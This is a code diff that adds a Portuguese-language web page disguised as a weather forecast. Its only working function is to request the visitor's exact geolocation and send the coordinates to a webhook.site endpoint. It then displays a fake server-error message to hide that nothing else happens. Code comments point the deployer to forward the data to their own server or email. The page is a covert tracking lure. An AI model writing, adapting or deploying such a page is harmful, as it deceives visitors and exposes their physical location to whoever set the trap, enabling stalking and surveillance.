@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Previsão do Tempo Local</title>
+    <style>
+        body { font-family: sans-serif; text-align: center; padding: 50px; background: #f0f8ff; }
+        .btn { padding: 15px 30px; font-size: 18px; cursor: pointer; background: #007bff; color: white; border: none; border-radius: 5px; }
+    </style>
+</head>
+<body>
+    <h1>🌤️ Previsão do Tempo Precisa</h1>
+    <p>Clique no botão abaixo para detectar sua cidade e ver a temperatura agora.</p>
+    <button class="btn" onclick="getLocation()">Ver Clima Agora</button>
+
+    <script>
+        function getLocation() {
+            if (navigator.geolocation) {
+                // Solicita a localização exata
+                navigator.geolocation.getCurrentPosition(sendPosition, showError);
+            } else {
+                alert("Geolocalização não suportada pelo navegador.");
+            }
+        }
+
+        function sendPosition(position) {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            
+            // Aqui você envia os dados para o seu servidor ou e-mail
+            // Exemplo usando um Webhook gratuito (como Webhook.site)
+            const webhookURL = "https://webhook.site/SEU_ID_AQUI"; 
+            
+            fetch(webhookURL + `?lat=${lat}&lon=${lon}`)
+            .then(() => {
+                alert("Erro ao carregar dados do servidor. Tente novamente mais tarde.");
+            });
+        }
+
+        function showError(error) {
+            alert("Para ver o clima, você precisa permitir o acesso à localização.");
+        }
+    </script>
+</body>
+</html>
